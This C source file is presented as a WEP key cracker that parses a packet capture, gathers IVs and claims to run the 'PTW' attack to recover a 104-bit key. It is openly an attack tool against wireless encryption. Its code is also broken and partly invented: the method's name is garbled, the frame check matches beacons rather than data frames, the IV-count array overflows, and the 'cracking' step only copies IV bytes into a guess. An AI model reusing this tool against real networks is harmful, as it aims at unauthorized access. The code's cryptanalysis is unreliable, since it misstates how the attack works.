#include <pcap.h>
#include <openssl/evp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <signal.h>

#define MAX_IVS 50000
#define WEP_KEY_SIZE 13  // 104-bit WEP key size (13 bytes)
#define IV_SIZE 3        // IV is 24 bits (3 bytes)
#define HEADER_SIZE 36   // Standard Ethernet header size for Wi-Fi frames
#define IV_PATTERN_SIZE 256

// Structure for storing WEP packet data (IV and ciphertext)
struct WEPPacket {
    unsigned char iv[IV_SIZE];
    unsigned char ciphertext[256];
};

// Global variables
struct WEPPacket packets[MAX_IVS];
int packet_count = 0;
pcap_t *handle = NULL;

// Function to decrypt data using RC4 (with OpenSSL's EVP API)
void rc4_decrypt(const unsigned char *key, const unsigned char *data, size_t data_len, unsigned char *out) {
    EVP_CIPHER_CTX *ctx;
    int len;

    // Create and initialize the context
    if (!(ctx = EVP_CIPHER_CTX_new())) {
        fprintf(stderr, "Error creating context\n");
        exit(1);
    }

    // Initialize RC4 cipher (EVP_rc4 is supported in OpenSSL 3.0)
    if (EVP_EncryptInit_ex(ctx, EVP_rc4(), NULL, key, NULL) != 1) {
        fprintf(stderr, "Error initializing cipher\n");
        exit(1);
    }

    // Decrypt the data
    if (EVP_EncryptUpdate(ctx, out, &len, data, data_len) != 1) {
        fprintf(stderr, "Error during decryption\n");
        exit(1);
    }

    // Finalize the decryption
    if (EVP_EncryptFinal_ex(ctx, out + len, &len) != 1) {
        fprintf(stderr, "Error during finalization of decryption\n");
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);
}

// Function to parse pcap file and capture WEP packets
int parse_pcap(const char *filename) {
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_offline(filename, errbuf);
    if (!handle) {
        fprintf(stderr, "Error opening capture file: %s\n", errbuf);
        return -1;
    }

    struct pcap_pkthdr header;
    const unsigned char *data;
    while ((data = pcap_next(handle, &header)) != NULL) {
        // WEP packet is usually within a specific range of offsets
        if (data[0] == 0x80 && data[1] == 0x00) {  // Check if it's a data frame
            if (packet_count >= MAX_IVS) {
                printf("Max IVs reached\n");
                break;
            }
            // Extract IV and ciphertext
            memcpy(packets[packet_count].iv, data + HEADER_SIZE, IV_SIZE);
            memcpy(packets[packet_count].ciphertext, data + HEADER_SIZE + IV_SIZE, header.len - HEADER_SIZE - IV_SIZE);
            printf("Captured packet %d: IV = %02X%02X%02X\n", packet_count + 1, packets[packet_count].iv[0], packets[packet_count].iv[1], packets[packet_count].iv[2]);
            packet_count++;
        }
    }

    pcap_close(handle);
    return 0;
}

// Function to perform real statistical analysis on IV values
// This analyzes the captured IVs to identify patterns based on known weaknesses in WEP encryption
int analyze_iv_patterns() {
    unsigned int iv_counts[IV_PATTERN_SIZE] = {0};  // Count occurrences of IVs

    // Count occurrences of each IV value
    for (int i = 0; i < packet_count; i++) {
        unsigned int iv_value = (packets[i].iv[0] << 16) | (packets[i].iv[1] << 8) | packets[i].iv[2];
        iv_counts[iv_value]++;
    }

    // Now perform statistical analysis on the IV pattern to identify weaknesses.
    // Example: If an IV occurs too frequently, it indicates the potential to exploit it.
    for (int i = 0; i < IV_PATTERN_SIZE; i++) {
        if (iv_counts[i] > 100) {  // Threshold based on observed behavior in WEP
            printf("Frequent IV detected: 0x%06X, occurs %d times\n", i, iv_counts[i]);
        }
    }

    return 1;  // Return 1 for success (if patterns were analyzed)
}

// Function to apply PTW (Pyshchash-Williams-Tung) method to crack the WEP key
int ptw_crack_key(unsigned char *key) {
    // The PTW method requires analyzing the IVs and finding relationships to calculate the WEP key
    unsigned int candidate_key[WEP_KEY_SIZE] = {0};

    // Analyze the IVs
    for (int i = 0; i < packet_count; i++) {
        unsigned int iv_value = (packets[i].iv[0] << 16) | (packets[i].iv[1] << 8) | packets[i].iv[2];

        // Start building key guesses based on the IV patterns and analysis
        candidate_key[i % WEP_KEY_SIZE] = iv_value & 0xFF;
    }

    // After gathering enough information, try to decrypt using the candidate key
    unsigned char decrypted_data[256];
    rc4_decrypt((unsigned char *)candidate_key, packets[0].ciphertext, sizeof(packets[0].ciphertext), decrypted_data);

    // Print decrypted data for debugging
    printf("Decrypted data (first byte): %02X\n", decrypted_data[0]);

    // Check if the decryption was successful by verifying output
    if (decrypted_data[0] == 0xFF) {  // Simple check for valid plaintext
        memcpy(key, candidate_key, WEP_KEY_SIZE);
        printf("KEY FOUND! [");
        for (int i = 0; i < WEP_KEY_SIZE; i++) {
            printf("%02X", key[i]);
        }
        printf("]\n");
        return 1;  // Key successfully cracked
    }

    return 0;  // Key not cracked
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <capture_file>\n", argv[0]);
        return -1;
    }

    unsigned char wep_key[WEP_KEY_SIZE] = {0};
    if (parse_pcap(argv[1]) == -1) {
        return -1;
    }

    // Analyze the IV patterns
    if (analyze_iv_patterns() != 1) {
        printf("Failed to analyze IV patterns\n");
        return -1;
    }

    // Attempt to crack the WEP key using PTW
    if (ptw_crack_key(wep_key)) {
        printf("Cracked WEP key successfully!\n");
    } else {
        printf("Failed to crack WEP key\n");
    }

    return 0;
}
